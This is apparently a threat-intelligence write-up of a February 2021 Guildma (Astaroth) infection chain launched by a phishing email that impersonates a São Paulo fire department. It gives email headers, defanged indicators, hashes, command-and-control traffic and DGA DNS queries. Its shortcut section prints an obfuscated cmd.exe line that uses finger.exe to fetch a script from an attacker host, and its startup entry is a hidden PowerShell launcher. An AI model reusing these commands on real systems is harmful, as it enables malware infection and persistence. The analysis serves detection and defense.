@@ -1,0 +1,135 @@
+2021-02-22 (MONDAY) - GUILDMA (ASTAROTH) MALWARE FROM EMAIL IMPERSONATING MUNICIPAL FIRE DEPARTMENT IN BRAZIL
+
+REFERENCE:
+
+- https://twitter.com/Unit42_Intel/status/1364285932296355844
+
+NOTE:
+
+- This is similar to activity we tweeted about in December 2020 at: https://twitter.com/unit42_intel/status/1334650143656865792
+- This is also similar to activity from Friday 2021-02-19 posted at: https://www.malware-traffic-analysis.net/2021/02/19/index.html
+
+EMAIL HEADERS:
+
+Return-Path: <vistoria44965@ricardo01.financeirozattini.app>
+Received: from ricardo01.financeirozattini.app (ricardo01.financeirozattini.app [167.114.153.192])
+	by [recipient's mail server] for <[recipient's email address]>; 
+	Mon, 22 Feb 2021 13:10:58 +0000 (UTC)
+Received: by ricardo01.financeirozattini.app (Exim, from userid 33)
+	id 141703F77D; Mon, 22 Feb 2021 10:09:02 -0300 (-03)
+To: [recipient's email address]
+Subject: Vistoria do Corpo de Bombeiros - Comunicado Importante [22/02/2021] - [10:09:01]
+MIME-Version: 1.0
+From: Corpo de Bombeiros <vistoria44965@bombeiros.sp.gov.br>
+Date: Mon, 22 Feb 2021 10:09:01 -0300
+Reply-To: vistoria44965@bombeiros.sp.gov.br
+Content-type: multipart/mixed; boundary="-------220220210901_eed9141642cc1de0c0f1464b675dc41a"
+Message-Id: <20210222130902.141703F77D@ricardo01.financeirozattini.app>
+
+LINK FROM EMAIL:
+
+- hxxp://djuaai.vistoriabombeiros[.]email/P6JL90AADZ50P50036GTZ2T54H565/Protocolo_Vistoria_22/02/2021.JPG
+
+DOWNLOADED MALWARE:
+
+- SHA256 hash: c05776e9b82150c2dacf4124dfd1f8abd83121dc43090cf6d754027de40972ba
+- File size: 433 bytes
+- File location: hxxp://djuaai.vistoriabombeiros[.]email//TMTDSXZXL/N8JWFBW79K2C/79649186/8662.03.819z64y64
+- File name: 8662.03.819508.zip
+- File description: ZIP archive downloaded after clicking link from email
+
+- SHA256 hash: dc6f6ffae682b47975891b7b87e6b078d96bee593dc2a15237ee99243839644d
+- File size: 414 bytes
+- File name: 8662.03.81968.LNK
+- File description: Windows shortcut extracted from the downloaded ZIP archive
+- Destination from shortcut: C:\Windows\System32\cmd.exe /V/c "sET DQBT=^|mhY89orhY89e +hY892 ^|chY89mhY89d&&sET KSMOH=fihY89ngehY89r.exe ohY89k@rbeiwd.
+  bombeirosgov.xyz&&sEt CUSW=!KSMOH:hY89=!&&sEt XYBIS=!DQBT:hY89=!&&cmd /c !CUSW! !XYBIS!
+
+SHORTCUT AT C:\USERS\[username]\APPDATA\ROAMING\MICROSOFT\WINDOWS\START MENU\PROGRAMS\STARTUP:
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -Command C:\Users\Public\Downloads\YWW48183617672P\
+svchost.exe /L C:\Users\Public\Downloads\YWW48183617672P\win.dll dummy_assembly_name
+
+MALICIOUS FILES FROM THE INFECTED WINDOWS HOST:
+
+- SHA256 hash: 412a6b755b2029126d46e7469854add3faa850f5a4700dd1e078fcc536ca418a
+- File size: 68,744 bytes
+- File location: C:\Users\Public\Downloads\YWW48183617672P\svchost.exe
+- File description: Copy of coregen.exe, Microsoft Common Language Runtime native compiler, from Silverlight
+- Note: This file is not malicious, but it's used to load/run a malicious DLL (win.dll, shown below)
+
+- SHA256 hash: 676f1a903ea6fa5c100138e772a8528298290ab04a37638070882f1d45a23870
+- File size: 1,752,064 bytes
+- File location: C:\Users\Public\Downloads\YWW48183617672P\win.dll
+- File description: DLL loaded and urn by coregen.exe (renamed svchost.exe shown above)
+
+- SHA256 hash: 4c8eb03af8f031d5ff1c9bd85011d8a69305377d5f5e226ead9f030843bbe75e
+- File size: 1,924,776 bytes 
+- File location: C:\Users\Public\Downloads\YWW48183617672P\log32.dll
+- File description: DLL file obfuscated with XOR string (not malicious until decoded/deobfuscated)
+
+- SHA256 hash: 9da4fb13ffd80cb1e9d4c18b61b8701c50fb2540687eb08cb21470810e4dc0a1
+- File size: 1,924,776 bytes 
+- File location: N/A
+- File description: Deobfuscated log32.dll from above file, the actual malware DLL
+
+- SHA256 hash: 556030afa198317663d9fde94f9e2e605485d0537c3e6719235b3be9eec940c2
+- File size: 1,758,983 bytes
+- File location: C:\Users\Public\Downloads\YWW48183617672P\log33.dll
+- File description: DLL file obfuscated with XOR string (not malicious until decoded/deobfuscated)
+
+- SHA256 hash: 12432f9ad1ab19a0ae6b07bfa658e0becba4e996c2abc79c985952de31403300
+- File size: 1,758,983 bytes
+- File location: N/A
+- File description: Deobfuscated log33.dll from above file, the actual malware DLL
+
+WEB TRAFFIC TO DOWNLOAD ZIP ARCHIVE AFTER CLICKING LINK FROM EMAIL:
+
+- 172.67.206[.]3 port 80 - djuaai.vistoriabombeiros[.]email - GET /P6JL90AADZ50P50036GTZ2T54H565/Protocolo_Vistoria_22/02/2021.JPG
+- 81.169.145[.]66 port 80 - www.xi-hu[.]de - GET /tag.php?tag=%3Cscript%20src=%22hxxps://ajax.googleapis[.]com/ajax/libs/jquery/3.3.1/
+                                             jquery.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%20src=%22hxxp://
+                                             djuaai.vistoriabombeiros[.]email/jquery.min.php%22%3E%3C/script%3E?
+- 172.67.206[.]3 port 80 - djuaai.vistoriabombeiros[.]email GET /jquery.min.php
+- 81.169.145[.]66 port 80 - www.xi-hu[.]de - GET /img/holz.jpg
+- 172.67.206[.]3 port 80 - djuaai.vistoriabombeiros[.]email - GET /TMTDSXZXL/N8JWFBW79K2C/79649186/8662.03.819z64y64
+
+INFECTION TRAFFIC (TCP):
+
+- 35.222.105[.]34 port 79- rbeiwd.bombeirosgov[.]xyz - TCP traffic (retruned obfuscated batch script)
+- 104.21.29[.]109 port 80 - ktaee3.ncocotdenc[.]date - GET /?1/
+- 172.67.201[.]180 port 443 - wat8.owpxfymsrl[.]casa - HTTPS traffic
+- 172.67.157[.]19 port 443 - www.atrak[.]gold - HTTPS traffic
+- 172.67.143[.]50 port 80 - a8f907a15dd256a8efdeefa1b4296a10.cfjhrfrdprfudjhefdpsforuasdcuicb[.]tk - POST /
+- 104.21.39[.]43 port 80 - ead7b06da12ff1ad3601bc0e58d8378b.cfjhrfrdprfudjhefdpsforuasdcuicb[.]tk - POST /
+
+INFECTION TRAFFIC (DNS):
+
+- NOTE 1: These DNS queries did not to an external source, but went to the normal internal DNS resolver.
+- NOTE 2: The infected host generated approximately 10 of these DNS queries on average each second.
+- NOTE 3: Below are the initial 25 examples seen from an infection run.
+
+- DNS query for d852e90de17f0e95cfa4e6bca58fdc7e.ppcrbpcofpofadfdhragrrcfiidmeufu.fun - response: No such name
+- DNS query for d3fcad4e8c158a8347f69755408afe9c.hgebbgepeoaufjucdriibuuheamduohp.buzz - response: No such name
+- DNS query for 84d5c615a6148b4a64748944ab4fea32.daeoccijpuuujifgeusprsadbjabspas.monster - response: No such name
+- DNS query for b9a3966d49f092087e84c2b2d47bddd6.dsofhsbehebshfsefaagordmrcefguiu.top - response: No such name
+- DNS query for 9af27bde5afc7d2f9d5a54cfb940eb23.afisohduhmbuiebbmcpgedmdahpsmoaa.xyz - response: No such name
+- DNS query for 3fdde23513cfea8244865de9dfc24576.baapceffjrpmdjjsdergsiefijcpuodo.xyz - response: No such name
+- DNS query for d685edc33c9821948bad8f053744e671.hjaejauhfiecmhrsbpdmfafhaghrubmr.site - response: No such name
+- DNS query for 6b07d8ebf16094112539933605bc959b.jgiscuhreojgjmppmprdcaaabsbrsago.online - response: No such name
+- DNS query for 5f73dc9aab98162a161124bb9b33e0f3.crjusgsfuoghrcgbiesccrsgfdimejdh.gq - response: No such name
+- DNS query for e9ea25b57f0f347a7f49cb9d560b7c9f.iffbhggmcimrgsgdsopaiaeoapjhfhor.cf - response: No such name
+- DNS query for a7852fbe6a64197636486f136fcd1b9f.duiispaamoafbshuegpdjdmmrdrormpr.cf - response: No such name
+- DNS query for 2f62d23644cbc7648fae3c8a7e49ee55.dmoujibiogrmcgabfiaamuhmrodocaom.ga - response: No such name
+- DNS query for 756cc5b1bad841d9bcca71f5ef35d172.afhoasaoumhmcepdugfhmrcehjdaujui.ml - response: No such name
+- DNS query for 7fc673d1de394b80e8c31e56741530f3.upiejiuspmmoafamjrcsfurdrggdjidg.tk - response: No such name
+- DNS query for b93dbe13513d3725c86e06472667e0dc.upjodfgeamscjrbgsijbapbebhjuphcc.tk - response: No such name
+- DNS query for ecbacb2226e502ed95e4ca36775be81e.upmrjdauhjrogmcipcjdcofjumjsjubr.tech - response: No such name
+- DNS query for e48e99830d9692e59da0b467d2e7e859.dajahireoippjuoaprburmsjohsirbrm.live - response: No such name
+- DNS query for 27e15cfae240de235bc0b1063835c282.poicirorodmjmieeffjpifhmoroibajc.store - response: No such name
+- DNS query for fd15e0d9a0f3ca129bfda36be54193de.fmcgdifjhaffogrhgmfcjehhausjfpjf.space - response: No such name
+- DNS query for c2d4305977b663085c423d764398115b.pfiaodebsgmsdgaaamoofoiabdcmegha.best - response: No such name
+- DNS query for b9a3966d49f092087e84c2b2d47bddd6.dsofhsbehebshfsefaagordmrcefguiu.top - response: No such name
+- DNS query for 84d5c615a6148b4a64748944ab4fea32.daeoccijpuuujifgeusprsadbjabspas.monster - response: No such name
+- DNS query for 58b48f2a4111bbcfca5a5c29c7a62149.mhfpudaosgoecimrsaoupupajrjscgro.site - response: No such name
+- DNS query for eb952bcdead65806877687be3db00367.egbggdgogrjjfgpheoiaeaiampppjaum.cf - response: No such name
+- DNS query for 6dc7e6324002d963a9f17d1b68234ed6.ebaaefmooecmmibdaipahradcgcfebph.best - response: No such name
